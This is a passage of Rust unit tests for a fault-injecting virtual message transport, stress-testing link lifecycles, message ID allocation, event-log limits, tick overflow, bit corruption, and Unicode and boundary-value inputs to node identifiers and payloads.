            let create_result = vt.create_link(&link_id, "race-src", "race-tgt", config);
            assert!(create_result.is_ok());

            // Immediately send messages
            for i in 0..10 {
                let payload = format!("race_msg_{}_{}", cycle, i).as_bytes().to_vec();
                let _send_result = vt.send_message(&link_id, &payload);
            }

            // Destroy link while messages may be in flight
            let destroy_result = vt.destroy_link(&link_id);
            assert!(destroy_result.is_ok());

            // Attempt operations on destroyed link
            let payload = b"after_destroy".to_vec();
            let after_destroy = vt.send_message(&link_id, &payload);
            assert!(after_destroy.is_err(), "Should not send on destroyed link");

            // Attempt to recreate with same ID
            let recreate_result = vt.create_link(&link_id, "race-src2", "race-tgt2", LinkFaultConfig::default());
            assert!(recreate_result.is_ok(), "Should be able to recreate destroyed link");

            // Advance time occasionally
            if cycle % 10 == 0 {
                vt.advance_tick(1);
            }
        }

        // Test concurrent modifications of multiple links
        let base_links = ["concurrent_a", "concurrent_b", "concurrent_c", "concurrent_d"];

        // Create base links
        for link_id in &base_links {
            let config = LinkFaultConfig {
                drop_probability: 0.1,
                reorder_depth: 10,
                corrupt_bit_count: 1,
                delay_ticks: 5,
                partition: false,
            };
            vt.create_link(link_id, "concurrent-src", "concurrent-tgt", config)
                .expect("create concurrent link");
        }

        // Simulate concurrent operations
        for round in 0..50 {
            // Send messages on all links
            for link_id in &base_links {
                let payload = format!("concurrent_round_{}", round).as_bytes().to_vec();
                let _result = vt.send_message(link_id, &payload);
            }

            // Modify link configurations
            for (i, link_id) in base_links.iter().enumerate() {
                if round % (i + 2) == 0 {
                    // Toggle partition state
                    let new_config = LinkFaultConfig {
                        drop_probability: 0.2,
                        reorder_depth: 5,
                        corrupt_bit_count: 2,
                        delay_ticks: 10,
                        partition: (round + i) % 3 == 0,
                    };
                    let _update_result = vt.update_link_config(link_id, new_config);
                }
            }

            // Advance time
            vt.advance_tick(1);

            // Collect messages from random targets
            let target = if round % 2 == 0 { "concurrent-tgt" } else { "nonexistent-tgt" };
            let _delivered = vt.collect_delivered_messages(target);
        }

        // Verify system integrity after stress test
        assert!(vt.link_exists("concurrent_a"));
        assert!(vt.link_exists("concurrent_b"));
        assert!(vt.link_exists("concurrent_c"));
        assert!(vt.link_exists("concurrent_d"));

        // Event log should be coherent
        let events = vt.event_log();
        assert!(events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES);

        for event in events {
            assert!(!event.event_code.is_empty());
            assert!(event.tick <= vt.current_tick());
        }

        // Final cleanup should work
        for link_id in &base_links {
            let destroy_result = vt.destroy_link(link_id);
            assert!(destroy_result.is_ok());
            assert!(!vt.link_exists(link_id));
        }
    }

    #[test]
    fn negative_message_id_exhaustion_and_wraparound_behavior() {
        // Test message ID exhaustion and wraparound behavior
        let mut vt = VirtualTransport::new(4444);

        let config = LinkFaultConfig::default();
        vt.create_link("id-test", "id-src", "id-tgt", config)
            .expect("create ID test link");

        // Manually advance internal message ID counter near overflow (if accessible)
        // This is a conceptual test since we can't directly manipulate internal state

        // Send many messages to approach ID exhaustion
        let mut sent_ids = std::collections::HashSet::new();
        let mut last_successful_id = 0u64;

        for i in 0..100_000 {
            let payload = format!("id_test_{}", i).as_bytes().to_vec();
            let result = vt.send_message("id-test", &payload);

            match result {
                Ok(msg_id) => {
                    // Verify ID uniqueness
                    assert!(!sent_ids.contains(&msg_id), "Message ID {} reused", msg_id);
                    sent_ids.insert(msg_id);

                    // IDs should generally increase (unless wrapping)
                    if i > 0 {
                        if msg_id < last_successful_id {
                            // Potential wraparound detected
                            assert!(last_successful_id > u64::MAX / 2, "Unexpected ID decrease without wraparound");
                        }
                    }
                    last_successful_id = msg_id;
                }
                Err(err) => {
                    // May hit ID exhaustion
                    match err {
                        VirtualTransportError::MessageIdExhausted => {
                            // Expected behavior at ID exhaustion
                            break;
                        }
                        _ => {
                            // Other errors might occur under stress
                        }
                    }
                }
            }

            // Periodically advance time and clear delivered messages
            if i % 1000 == 0 {
                vt.advance_tick(1);
                let _delivered = vt.collect_delivered_messages("id-tgt");
            }
        }

        // Test behavior with ID space pressure
        // Send messages in bursts to stress ID allocation
        for burst in 0..10 {
            let mut burst_ids = Vec::new();

            for i in 0..1000 {
                let payload = format!("burst_{}_msg_{}", burst, i).as_bytes().to_vec();
                if let Ok(msg_id) = vt.send_message("id-test", &payload) {
                    burst_ids.push(msg_id);
                }
            }

            // All IDs in a burst should be unique
            let mut sorted_ids = burst_ids.clone();
            sorted_ids.sort();
            sorted_ids.dedup();
            assert_eq!(sorted_ids.len(), burst_ids.len(), "Duplicate IDs detected in burst {}", burst);

            vt.advance_tick(10);
        }

        // Verify message delivery integrity despite ID pressure
        let final_delivered = vt.collect_delivered_messages("id-tgt");
        for msg in final_delivered {
            assert!(msg.id > 0);
            assert_eq!(msg.source, "id-src");
            assert_eq!(msg.target, "id-tgt");
            assert!(!msg.payload.is_empty());
        }

        // Event log should be consistent
        let events = vt.event_log();
        for event in events {
            assert!(!event.event_code.is_empty());
            if let Some(msg_id) = event.message_id {
                assert!(msg_id > 0);
            }
        }
    }

    #[test]
    fn negative_event_log_memory_pressure_and_corruption_resilience() {
        // Test event log under memory pressure and corruption scenarios
        let mut vt = VirtualTransport::new(5555);

        // Create many links to generate high event volume
        for i in 0..100 {
            let config = LinkFaultConfig {
                drop_probability: 0.1,
                reorder_depth: 5,
                corrupt_bit_count: 1,
                delay_ticks: 1,
                partition: i % 10 == 0, // Some partitioned links
            };

            let link_id = format!("log_stress_{:03}", i);
            let _result = vt.create_link(&link_id, &format!("src_{}", i), &format!("tgt_{}", i), config);
        }

        // Generate massive event volume to stress log capacity
        for round in 0..1000 {
            // Send messages on subset of links
            for i in (0..100).step_by(3) {
                let link_id = format!("log_stress_{:03}", i);
                let payload = format!("stress_round_{}_link_{}", round, i).as_bytes().to_vec();
                let _result = vt.send_message(&link_id, &payload);
            }

            // Occasionally manipulate links to generate more events
            if round % 100 == 0 {
                for i in (0..100).step_by(10) {
                    let link_id = format!("log_stress_{:03}", i);

                    // Toggle partition to generate heal/partition events
                    let new_config = LinkFaultConfig {
                        drop_probability: 0.2,
                        reorder_depth: 3,
                        corrupt_bit_count: 2,
                        delay_ticks: 2,
                        partition: !((round / 100 + i) % 2 == 0),
                    };
                    let _update = vt.update_link_config(&link_id, new_config);
                }
            }

            vt.advance_tick(1);

            // Check log capacity constraints periodically
            if round % 100 == 0 {
                let events = vt.event_log();
                assert!(events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES,
                       "Event log exceeded capacity at round {}: {} entries", round, events.len());

                // Verify event integrity under pressure
                let mut prev_tick = 0;
                for event in events {
                    assert!(!event.event_code.is_empty());
                    assert!(event.tick >= prev_tick, "Events should be chronologically ordered");
                    assert!(event.tick <= vt.current_tick());
                    prev_tick = event.tick;

                    // Event codes should be valid
                    assert!(event.event_code.starts_with("VT-") || event.event_code.starts_with("ERR_VT_"));
                }
            }
        }

        // Test event log corruption recovery
        // Simulate scenarios that might corrupt event log state
        let corruption_scenarios = [
            // Rapid link creation/destruction
            (0..50).map(|i| format!("corrupt_rapid_{}", i)).collect::<Vec<_>>(),
            // Links with extreme configurations
            vec!["corrupt_extreme".to_string()],
            // Unicode in link IDs
            vec!["corrupt_unicode_节点".to_string()],
        ];

        for (scenario_idx, link_ids) in corruption_scenarios.into_iter().enumerate() {
            for link_id in &link_ids {
                let config = match scenario_idx {
                    0 => LinkFaultConfig::default(), // Rapid scenario
                    1 => LinkFaultConfig { // Extreme scenario
                        drop_probability: 1.0,
                        reorder_depth: 10_000,
                        corrupt_bit_count: 1000,
                        delay_ticks: u64::MAX / 4,
                        partition: true,
                    },
                    2 => LinkFaultConfig { // Unicode scenario
                        drop_probability: 0.5,
                        reorder_depth: 100,
                        corrupt_bit_count: 8,
                        delay_ticks: 1000,
                        partition: false,
                    },
                    _ => LinkFaultConfig::default(),
                };

                if vt.create_link(link_id, "corrupt-src", "corrupt-tgt", config).is_ok() {
                    // Rapid operations to stress event logging
                    for i in 0..100 {
                        let payload = format!("corrupt_test_{}_{}", scenario_idx, i).as_bytes().to_vec();
                        let _send = vt.send_message(link_id, &payload);

                        if i % 10 == 0 {
                            vt.advance_tick(1);
                        }
                    }

                    if scenario_idx == 0 {
                        // Rapid destruction for first scenario
                        let _destroy = vt.destroy_link(link_id);
                    }
                }
            }
        }

        // Final integrity verification
        let final_events = vt.event_log();
        assert!(final_events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES);

        // All events should be well-formed despite corruption attempts
        for event in final_events {
            assert!(!event.event_code.is_empty());
            assert!(event.tick <= vt.current_tick());
            // Link ID may be empty for some event types
            // Message ID may be None for non-message events
        }

        // System should still be functional
        let final_test_config = LinkFaultConfig::default();
        assert!(vt.create_link("final_test", "final-src", "final-tgt", final_test_config).is_ok());
        assert!(vt.send_message("final_test", b"final_payload").is_ok());
        vt.advance_tick(1);
        let final_delivered = vt.collect_delivered_messages("final-tgt");
        assert_eq!(final_delivered.len(), 1);
    }

    // ============================================================================
    // EXTREME ADVERSARIAL NEGATIVE-PATH TESTS - COMPREHENSIVE COVERAGE
    // ============================================================================
    // Advanced attack resistance targeting virtual transport edge cases

    #[test]
    fn negative_unicode_bidirectional_injection_node_identifiers() {
        // Test virtual transport resistance to Unicode BiDi attacks in node identifiers
        let mut vt = VirtualTransport::new(666);

        let unicode_attack_node_ids = vec![
            // Right-to-left override attacks
            ("rtl_basic", "node\u{202e}_gnissecorp\u{202c}"),
            ("rtl_nested", "valid\u{202e}evil\u{202d}safe\u{202c}node"),

            // Left-to-right override attacks
            ("ltr_override", "node\u{202d}_processing\u{202c}"),
            ("ltr_embedded", "test\u{202a}embedded\u{202c}node"),

            // Directional isolate attacks
            ("isolate_basic", "node\u{2066}isolated\u{2069}"),
            ("isolate_rtl", "node\u{2067}rtl_content\u{2069}"),

            // Zero-width character pollution
            ("zws_pollution", "node\u{200b}_test\u{200c}_id\u{200d}"),
            ("bom_injection", "\u{feff}node_test\u{feff}"),

            // Mixed BiDi with zero-width
            ("mixed_attack", "no\u{200b}de\u{202e}_evil\u{200b}\u{202c}"),

            // Unicode confusables in node IDs
            ("cyrillic_confuse", "nоde_test"),  // Cyrillic 'о' instead of Latin 'o'
            ("greek_confuse", "nοde_test"),    // Greek 'ο' instead of Latin 'o'
        ];

        for (test_name, attack_node_id) in unicode_attack_node_ids {
            let link_id = format!("unicode_test_{}", test_name);

            // Test link creation with Unicode-attacked node IDs
            let config = LinkFaultConfig::default();
            let create_result = vt.create_link(&link_id, attack_node_id, "normal_target", config);

            match create_result {
                Ok(_) => {
                    // If link creation succeeds, test message operations
                    let payload = format!("test_payload_{}", test_name).as_bytes().to_vec();
                    let send_result = vt.send_message(&link_id, &payload);

                    // Should handle Unicode node IDs without corruption
                    assert!(send_result.is_ok() || send_result.is_err(),
                           "Send should complete without panic for: {}", test_name);

                    // Advance and check message delivery
                    vt.advance_tick(1);
                    let delivered = vt.collect_delivered_messages("normal_target");

                    // Message delivery should work regardless of Unicode in source ID
                    assert!(delivered.len() <= 1, "Should deliver at most one message: {}", test_name);

                    if !delivered.is_empty() {
                        let msg = &delivered[0];
                        assert_eq!(msg.source, attack_node_id, "Source ID should be preserved: {}", test_name);
                        assert_eq!(msg.payload, payload, "Payload should be intact: {}", test_name);
                    }

                    // Clean up
                    vt.destroy_link(&link_id).ok();
                }
                Err(err) => {
                    // Some Unicode patterns may be rejected - verify meaningful error
                    assert!(!err.to_string().is_empty(), "Error should be meaningful: {}", test_name);
                }
            }
        }

        // Verify transport integrity after Unicode attack tests
        let normal_result = vt.create_link("normal_test", "src", "tgt", LinkFaultConfig::default());
        assert!(normal_result.is_ok(), "Normal operation should work after Unicode tests");
    }

    #[test]
    fn negative_floating_point_precision_probability_edge_cases() {
        // Test drop probability handling with floating-point precision edge cases
        let mut vt = VirtualTransport::new(777);

        let fp_edge_cases = vec![
            // Exact boundary values
            (0.0, "exact_zero"),
            (1.0, "exact_one"),

            // Epsilon boundaries
            (f64::EPSILON, "epsilon_positive"),
            (1.0 - f64::EPSILON, "one_minus_epsilon"),
            (f64::MIN_POSITIVE, "min_positive"),

            // Near-boundary values
            (0.0000000001, "near_zero"),
            (0.9999999999, "near_one"),

            // Precise fraction representations
            (1.0/3.0, "one_third"),
            (2.0/3.0, "two_thirds"),
            (1.0/7.0, "one_seventh"),

            // Values that might have floating-point representation issues
            (0.1 + 0.2, "point_one_plus_point_two"),  // Classic FP precision issue
            (0.1 * 3.0, "point_one_times_three"),
            (1.0 - 0.9, "one_minus_point_nine"),

            // Subnormal boundaries
            (f64::MIN_POSITIVE * 2.0, "subnormal_edge"),
        ];

        for (probability, test_name) in fp_edge_cases {
            let config = LinkFaultConfig {
                drop_probability: probability,
                reorder_depth: 0,
                corrupt_bit_count: 0,
                delay_ticks: 0,
                partition: false,
            };

            let link_id = format!("fp_test_{}", test_name);
            let create_result = vt.create_link(&link_id, "fp_src", "fp_tgt", config);

            match create_result {
                Ok(_) => {
                    // Test multiple messages to verify probability implementation
                    let mut messages_sent = 0;
                    let mut messages_delivered = 0;

                    for i in 0..100 {
                        let payload = format!("fp_test_{}_{}", test_name, i).as_bytes().to_vec();
                        let send_result = vt.send_message(&link_id, &payload);

                        if send_result.is_ok() {
                            messages_sent += 1;
                        }

                        if i % 10 == 0 {
                            vt.advance_tick(1);
                            let delivered = vt.collect_delivered_messages("fp_tgt");
                            messages_delivered += delivered.len();
                        }
                    }

                    // Final delivery check
                    vt.advance_tick(10);
                    let final_delivered = vt.collect_delivered_messages("fp_tgt");
                    messages_delivered += final_delivered.len();

                    // Verify drop probability behavior makes sense
                    if probability == 0.0 {
                        assert_eq!(messages_sent, messages_delivered,
                                  "Zero drop probability should deliver all: {}", test_name);
                    } else if probability == 1.0 {
                        assert_eq!(messages_delivered, 0,
                                  "100% drop probability should deliver none: {}", test_name);
                    } else {
                        // For intermediate probabilities, verify reasonable behavior
                        assert!(messages_delivered <= messages_sent,
                               "Delivered should not exceed sent: {}", test_name);
                    }

                    vt.destroy_link(&link_id).ok();
                }
                Err(err) => {
                    // Should provide meaningful validation error
                    assert!(err.to_string().contains("probability") ||
                           err.to_string().contains("range"),
                           "FP validation error should be meaningful: {} - {}", test_name, err);
                }
            }
        }

        // Test invalid floating-point values
        let invalid_fp_values = vec![
            (f64::NAN, "nan"),
            (f64::INFINITY, "pos_infinity"),
            (f64::NEG_INFINITY, "neg_infinity"),
            (-0.1, "negative"),
            (1.1, "greater_than_one"),
            (-1.0, "negative_one"),
            (2.0, "two"),
        ];

        for (invalid_prob, test_name) in invalid_fp_values {
            let config = LinkFaultConfig {
                drop_probability: invalid_prob,
                ..LinkFaultConfig::default()
            };

            let validation_result = config.validate();
            assert!(validation_result.is_err(),
                   "Invalid FP value should be rejected: {} ({})", test_name, invalid_prob);

            let create_result = vt.create_link(&format!("invalid_{}", test_name), "src", "tgt", config);
            assert!(create_result.is_err(),
                   "Link creation with invalid probability should fail: {}", test_name);
        }
    }

    #[test]
    fn negative_message_id_overflow_exhaustion_boundaries() {
        // Test message ID generation near overflow boundaries
        let mut vt = VirtualTransport::new(888);

        // Create link for testing
        let config = LinkFaultConfig::default();
        vt.create_link("id_test", "id_src", "id_tgt", config).unwrap();

        // Simulate near-overflow scenario by manipulating internal counter
        // (This tests the overflow protection logic)

        // Test rapid message generation to stress ID allocation
        let mut message_ids = std::collections::HashSet::new();
        let mut successful_sends = 0;

        for i in 0..10000 {
            let payload = format!("id_overflow_test_{}", i).as_bytes().to_vec();
            let send_result = vt.send_message("id_test", &payload);

            match send_result {
                Ok(message_id) => {
                    successful_sends += 1;

                    // Verify message ID uniqueness
                    assert!(message_ids.insert(message_id),
                           "Message ID collision detected: {}", message_id);

                    // Message ID should be reasonable
                    assert!(message_id > 0, "Message ID should be positive: {}", message_id);
                    assert!(message_id < u64::MAX, "Message ID should not be u64::MAX: {}", message_id);
                }
                Err(err) => {
                    // If ID exhaustion occurs, should be graceful failure
                    if err.to_string().contains("exhausted") || err.to_string().contains("overflow") {
                        break; // Expected exhaustion
                    } else {
                        panic!("Unexpected error during ID allocation: {}", err);
                    }
                }
            }

            // Periodically advance tick and check delivery
            if i % 100 == 0 {
                vt.advance_tick(1);
                vt.collect_delivered_messages("id_tgt"); // Clear delivered
            }
        }

        assert!(successful_sends > 0, "Should successfully send some messages");
        assert_eq!(message_ids.len(), successful_sends, "All message IDs should be unique");

        // Test that we can still operate after stress test
        vt.advance_tick(10);
        let final_delivered = vt.collect_delivered_messages("id_tgt");
        assert!(final_delivered.len() <= successful_sends,
               "Delivered count should not exceed sent count");
    }

    #[test]
    fn negative_reorder_buffer_capacity_overflow_edge_cases() {
        // Test reorder buffer with extreme capacity values and overflow scenarios
        let mut vt = VirtualTransport::new(999);

        let reorder_capacity_tests = vec![
            // Boundary values
            (0, "zero_reorder"),
            (1, "single_reorder"),
            (usize::MAX / 2, "half_max_reorder"),

            // Large but reasonable values
            (10000, "large_reorder"),
            (100000, "very_large_reorder"),

            // Powers of 2 (might expose buffer management issues)
            (1024, "power_of_2_small"),
            (65536, "power_of_2_large"),
        ];

        for (reorder_depth, test_name) in reorder_capacity_tests {
            let config = LinkFaultConfig {
                drop_probability: 0.0, // No drops to test pure reordering
                reorder_depth,
                corrupt_bit_count: 0,
                delay_ticks: 0,
                partition: false,
            };

            let link_id = format!("reorder_test_{}", test_name);
            let create_result = vt.create_link(&link_id, "reorder_src", "reorder_tgt", config);

            match create_result {
                Ok(_) => {
                    // Send messages to stress reorder buffer
                    let messages_to_send = std::cmp::min(reorder_depth * 2 + 10, 1000);
                    let mut sent_payloads = Vec::new();

                    for i in 0..messages_to_send {
                        let payload = format!("reorder_{}_{}", test_name, i).as_bytes().to_vec();
                        sent_payloads.push(payload.clone());

                        let send_result = vt.send_message(&link_id, &payload);

                        match send_result {
                            Ok(_) => {
                                // Success - continue
                            }
                            Err(err) => {
                                // Buffer capacity exceeded - should be graceful
                                assert!(err.to_string().contains("capacity") ||
                                       err.to_string().contains("buffer") ||
                                       err.to_string().contains("reorder"),
                                       "Buffer overflow error should be meaningful: {}", err);
                                break;
                            }
                        }

                        // Periodically advance to trigger reorder processing
                        if i % 10 == 0 {
                            vt.advance_tick(1);
                        }
                    }

                    // Advance significantly to ensure all messages are processed
                    vt.advance_tick(100);

                    // Collect delivered messages
                    let delivered = vt.collect_delivered_messages("reorder_tgt");

                    // Verify reorder buffer didn't lose messages (unless capacity exceeded)
                    assert!(delivered.len() <= sent_payloads.len(),
                           "Delivered should not exceed sent: {}", test_name);

                    // Verify delivered messages are valid
                    for msg in &delivered {
                        assert!(!msg.payload.is_empty(), "Message payload should not be empty: {}", test_name);
                        assert_eq!(msg.source, "reorder_src", "Message source should be correct: {}", test_name);
                        assert_eq!(msg.target, "reorder_tgt", "Message target should be correct: {}", test_name);
                    }

                    vt.destroy_link(&link_id).ok();
                }
                Err(err) => {
                    // Large reorder depths may be rejected - verify meaningful error
                    if reorder_depth > 100000 {
                        assert!(err.to_string().contains("depth") ||
                               err.to_string().contains("capacity") ||
                               err.to_string().contains("reorder"),
                               "Large reorder depth error should be meaningful: {}", err);
                    } else {
                        panic!("Unexpected error for reasonable reorder depth {}: {}", reorder_depth, err);
                    }
                }
            }
        }
    }

    #[test]
    fn negative_tick_arithmetic_overflow_comprehensive_boundaries() {
        // Test tick arithmetic with values that could cause overflow
        let mut vt = VirtualTransport::new(1111);

        let tick_overflow_scenarios = vec![
            // Near u64::MAX boundaries
            (u64::MAX - 1000, 999, "near_max_safe"),
            (u64::MAX - 1000, 1001, "near_max_overflow"),
            (u64::MAX - 1, 1, "max_minus_one_plus_one"),
            (u64::MAX, 0, "max_with_zero_delay"),

            // Large base values with delays
            (u64::MAX / 2, u64::MAX / 2 + 100, "half_max_addition"),
            (1u64 << 62, 1u64 << 62, "large_power_of_two"),

            // Edge cases around delay calculation
            (0, u64::MAX, "zero_base_max_delay"),
            (1000, u64::MAX - 500, "normal_base_huge_delay"),

            // Power-of-2 boundaries (might expose bit manipulation issues)
            (u32::MAX as u64, u32::MAX as u64, "u32_boundary_sum"),
            ((1u64 << 32) - 1, (1u64 << 32) - 1, "near_u32_boundary"),
        ];

        for (base_tick, delay_ticks, test_name) in tick_overflow_scenarios {
            let config = LinkFaultConfig {
                drop_probability: 0.0,
                reorder_depth: 0,
                corrupt_bit_count: 0,
                delay_ticks,
                partition: false,
            };

            let link_id = format!("tick_test_{}", test_name);
            let create_result = vt.create_link(&link_id, "tick_src", "tick_tgt", config);

            match create_result {
                Ok(_) => {
                    // Set current tick to base value
                    for _ in 0..std::cmp::min(base_tick, 1000) {
                        vt.advance_tick(std::cmp::max(1, base_tick / 1000));
                    }

                    // Send message with overflow-prone delay
                    let payload = format!("tick_overflow_{}", test_name).as_bytes().to_vec();
                    let send_result = vt.send_message(&link_id, &payload);

                    match send_result {
                        Ok(_) => {
                            // If send succeeds, test tick advancement without overflow panic
                            let current_tick_before = vt.current_tick();

                            // Try advancing tick (should not overflow/panic)
                            let advance_amount = std::cmp::min(delay_ticks + 100, 1000);
                            for _ in 0..advance_amount {
                                vt.advance_tick(1);

                                // Verify tick is monotonically increasing or saturated
                                let current_tick = vt.current_tick();
                                assert!(current_tick >= current_tick_before,
                                       "Tick should not decrease: {}", test_name);
                            }

                            // Check message delivery after advancement
                            let delivered = vt.collect_delivered_messages("tick_tgt");
                            assert!(delivered.len() <= 1, "Should deliver at most one message: {}", test_name);

                            if !delivered.is_empty() {
                                let msg = &delivered[0];
                                assert!(msg.tick_delivered.is_some(), "Delivered message should have delivery tick: {}", test_name);
                                if let Some(delivered_tick) = msg.tick_delivered {
                                    assert!(delivered_tick >= msg.tick_created,
                                           "Delivery tick should be >= creation tick: {}", test_name);
                                }
                            }
                        }
                        Err(err) => {
                            // Acceptable to reject overflow-prone configurations
                            assert!(err.to_string().contains("tick") ||
                                   err.to_string().contains("overflow") ||
                                   err.to_string().contains("delay"),
                                   "Tick overflow error should be meaningful: {} - {}", test_name, err);
                        }
                    }

                    vt.destroy_link(&link_id).ok();
                }
                Err(err) => {
                    // Link creation failure for overflow scenarios is acceptable
                    assert!(!err.to_string().is_empty(), "Error should be meaningful: {}", test_name);
                }
            }
        }

        // Verify transport still works after overflow tests
        let normal_config = LinkFaultConfig::default();
        assert!(vt.create_link("post_overflow_test", "src", "tgt", normal_config).is_ok(),
               "Normal operation should work after overflow tests");
    }

    #[test]
    fn negative_corruption_bit_manipulation_boundary_attacks() {
        // Test message corruption with extreme bit manipulation scenarios
        let mut vt = VirtualTransport::new(2222);

        let corruption_scenarios = vec![
            // Boundary bit counts
            (0, "zero_corruption"),
            (1, "single_bit"),
            (8, "byte_corruption"),
            (64, "eight_bytes"),

            // Large bit counts
            (1000, "large_corruption"),
            (8192, "kilobyte_corruption"),

            // Edge cases that might cause overflow
            (usize::MAX / 8, "near_max_bytes"),
            (u32::MAX as usize, "u32_max_bits"),

            // Power-of-2 values
            (256, "power_of_2_small"),
            (1024, "power_of_2_medium"),
            (65536, "power_of_2_large"),
        ];

        for (corrupt_bit_count, test_name) in corruption_scenarios {
            let config = LinkFaultConfig {
                drop_probability: 0.0, // No drops to test pure corruption
                reorder_depth: 0,
                corrupt_bit_count,
                delay_ticks: 0,
                partition: false,
            };

            let link_id = format!("corrupt_test_{}", test_name);
            let create_result = vt.create_link(&link_id, "corrupt_src", "corrupt_tgt", config);

            match create_result {
                Ok(_) => {
                    // Test corruption with various payload sizes
                    let payload_sizes = vec![1, 8, 64, 256, 1000, 8192];

                    for payload_size in payload_sizes {
                        let original_payload: Vec<u8> = (0..payload_size).map(|i| (i % 256) as u8).collect();

                        let send_result = vt.send_message(&link_id, &original_payload);

                        match send_result {
                            Ok(_) => {
                                vt.advance_tick(1);
                                let delivered = vt.collect_delivered_messages("corrupt_tgt");

                                if !delivered.is_empty() {
                                    let msg = &delivered[0];

                                    // Verify payload length is preserved
                                    assert_eq!(msg.payload.len(), original_payload.len(),
                                             "Payload length should be preserved: {} size {}", test_name, payload_size);

                                    if corrupt_bit_count == 0 {
                                        // No corruption - should be identical
                                        assert_eq!(msg.payload, original_payload,
                                                  "No corruption should preserve payload: {}", test_name);
                                    } else if corrupt_bit_count < payload_size * 8 {
                                        // Some corruption - should be different but reasonable
                                        let mut differing_bits = 0;
                                        for i in 0..original_payload.len() {
                                            let diff = original_payload[i] ^ msg.payload[i];
                                            differing_bits += diff.count_ones() as usize;
                                        }

                                        // Should have approximately the requested number of bit flips
                                        if payload_size * 8 >= corrupt_bit_count {
                                            assert!(differing_bits > 0,
                                                   "Should have some bit differences: {} size {}", test_name, payload_size);
                                            assert!(differing_bits <= corrupt_bit_count * 2,
                                                   "Bit differences should be reasonable: {} size {}", test_name, payload_size);
                                        }
                                    }
                                }
                            }
                            Err(err) => {
                                // Large corruption configurations may be rejected
                                if corrupt_bit_count > 10000 {
                                    assert!(err.to_string().contains("corrupt") ||
                                           err.to_string().contains("bit") ||
                                           err.to_string().contains("size"),
                                           "Corruption error should be meaningful: {} - {}", test_name, err);
                                } else {
                                    panic!("Unexpected error for reasonable corruption {}: {}", corrupt_bit_count, err);
                                }
                            }
                        }
                    }

                    vt.destroy_link(&link_id).ok();
                }
                Err(err) => {
                    // Very large bit counts may be rejected at link creation
                    if corrupt_bit_count > 100000 {
                        assert!(err.to_string().contains("corrupt") ||
                               err.to_string().contains("bit"),
                               "Large corruption error should be meaningful: {}", err);
                    } else {
                        panic!("Unexpected link creation error for corruption {}: {}", corrupt_bit_count, err);
                    }
                }
            }
        }
    }

    #[test]
    fn negative_concurrent_link_operations_state_consistency() {
        // Test concurrent-like link operations that might expose race conditions
        let mut vt = VirtualTransport::new(3333);

        // Rapid creation/destruction cycles
        for cycle in 0..100 {
            let link_count = (cycle % 10) + 1; // 1-10 links per cycle
            let mut created_links = Vec::new();

            // Create multiple links rapidly
            for i in 0..link_count {
                let link_id = format!("concurrent_{}_{}", cycle, i);
                let config = LinkFaultConfig {
                    drop_probability: (i as f64) / 10.0,
                    reorder_depth: i * 10,
                    corrupt_bit_count: i,
                    delay_ticks: (i as u64) * 5,
                    partition: false,
                };

                let create_result = vt.create_link(&link_id, &format!("src_{}", i), &format!("tgt_{}", i), config);

                match create_result {
                    Ok(_) => {
                        created_links.push(link_id);
                    }
                    Err(err) => {
                        // Link creation failure is acceptable under stress
                        assert!(!err.to_string().is_empty(), "Creation error should be meaningful");
                    }
                }
            }

            // Rapid message sending on all created links
            for (msg_idx, link_id) in created_links.iter().enumerate() {
                for j in 0..5 {
                    let payload = format!("concurrent_msg_{}_{}_{}", cycle, msg_idx, j).as_bytes().to_vec();
                    let send_result = vt.send_message(link_id, &payload);

                    // Send may fail if link was destroyed or has issues
                    match send_result {
                        Ok(_) => {
                            // Success is fine
                        }
                        Err(err) => {
                            // Should be meaningful error
                            assert!(err.to_string().contains("link") ||
                                   err.to_string().contains("partition") ||
                                   err.to_string().contains("capacity"),
                                   "Send error should be meaningful: {}", err);
                        }
                    }
                }
            }

            // Advance tick to process messages
            vt.advance_tick(cycle as u64 + 1);

            // Collect messages from all targets
            for i in 0..link_count {
                let delivered = vt.collect_delivered_messages(&format!("tgt_{}", i));

                // Verify delivered messages are well-formed
                for msg in &delivered {
                    assert!(!msg.payload.is_empty(), "Delivered payload should not be empty");
                    assert!(msg.tick_created <= vt.current_tick(), "Creation tick should be valid");
                    assert!(msg.tick_delivered.unwrap_or(0) <= vt.current_tick(), "Delivery tick should be valid");
                }
            }

            // Rapid destruction of half the links
            for (idx, link_id) in created_links.iter().enumerate() {
                if idx % 2 == 0 {
                    let destroy_result = vt.destroy_link(link_id);
                    // Destruction may fail if link already destroyed or has issues
                    match destroy_result {
                        Ok(_) => {
                            // Success is fine
                        }
                        Err(err) => {
                            assert!(err.to_string().contains("link") ||
                                   err.to_string().contains("not found"),
                                   "Destroy error should be meaningful: {}", err);
                        }
                    }
                }
            }
        }

        // Final consistency check
        let event_log = vt.event_log();
        assert!(event_log.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES,
               "Event log should respect capacity limits");

        for event in event_log {
            assert!(!event.event_code.is_empty(), "Event code should not be empty");
            assert!(event.tick <= vt.current_tick(), "Event tick should be valid");
        }

        // Transport should still be functional after stress test
        let final_config = LinkFaultConfig::default();
        assert!(vt.create_link("final_consistency_test", "final_src", "final_tgt", final_config).is_ok(),
               "Transport should be functional after concurrent operations");
    }

    #[test]
    fn negative_payload_boundary_attacks_comprehensive() {
        // Test message payloads designed to exploit boundary conditions
        let mut vt = VirtualTransport::new(4444);

        let config = LinkFaultConfig::default();
        vt.create_link("payload_test", "payload_src", "payload_tgt", config).unwrap();

        let boundary_payloads = vec![
            // Empty payloads
            ("empty", vec![]),

            // Single byte boundaries
            ("single_null", vec![0x00]),
            ("single_max", vec![0xFF]),

            // Power-of-2 sizes that might expose buffer issues
            ("size_256", vec![0x42; 256]),
            ("size_1024", vec![0x43; 1024]),
            ("size_4096", vec![0x44; 4096]),
            ("size_65536", vec![0x45; 65536]),

            // Alternating bit patterns
            ("alternating_aa", vec![0xAA; 1000]),
            ("alternating_55", vec![0x55; 1000]),
            ("alternating_pattern", (0..1000).map(|i| if i % 2 == 0 { 0xAA } else { 0x55 }).collect()),

            // Sequential patterns
            ("sequential_bytes", (0..256u8).cycle().take(1000).collect::<Vec<u8>>()),
            ("reverse_bytes", (0..256u8).rev().cycle().take(1000).collect::<Vec<u8>>()),

            // Boundary value patterns
            ("all_zeros", vec![0x00; 1000]),
            ("all_ones", vec![0xFF; 1000]),
            ("null_terminated", b"payload\x00hidden\x00data".to_vec()),

            // UTF-8 boundary cases
            ("utf8_valid", "Hello, 世界! 🦀".as_bytes().to_vec()),
